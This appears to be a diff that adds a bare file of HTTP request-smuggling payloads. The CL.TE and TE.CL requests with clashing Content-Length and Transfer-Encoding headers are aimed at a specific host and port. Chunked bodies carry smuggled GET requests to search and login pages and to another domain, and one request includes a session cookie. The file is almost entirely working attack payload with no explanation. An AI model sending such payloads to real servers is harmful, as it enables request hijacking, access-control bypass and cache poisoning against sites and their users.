@@ -1,0 +1,98 @@
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Content-Length: 82
+Cookie: PHPSESSID=0a662729cca044895c3ef0c8f94f2682
+test=1234
+
+GET /search.php?id=1111-1111-1111 HTTP/1.1
+Host: file.i4624.tk:13024
+
+
+POST /post.php HTTP/1.1`r`nHost: file.i4624.tk:13024`r`nContent-Length: 200`r`nTransfer-Encoding: chunked`r`ntest=1234`r`n`r`nGET /search.php?id=1111-1111-1111 HTTP/1.1`r`nHost: file.i4624.tk:13024`r`n
+
+POST /post.php HTTP/1.1`r`nHost: file.i4624.tk:13024`r`nContent-Length: 13`r`nTransfer-Encoding: chunked`r`n`r`n0`r`nSMUGGLED
+
+
+
+
+
+
+
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Content-Length: 47
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: naver.com
+Foo: X
+
+
+
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Cookie: PHPSESSID=0a662729cca044895c3ef0c8f94f2682
+Transfer-Encoding: chunked
+Content-Length: 87
+test=1234
+
+0
+
+GET /search.php?id=1111-1111-1111 HTTP/1.1
+Host: file.i4624.tk:13024
+
+
+
+
+===TE:CL ===
+
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+
+Cache-Control: max-age=0
+Content-Length: 4
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+7c
+GET /login.php HTTP/1.1
+Host: file.i4624.tk:13024
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+
+
+
+
+======
+
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Cache-Control: max-age=0
+Content-Length: 4
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+7c
+GET /login.php HTTP/1.1
+Host: file.i4624.tk:13024
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
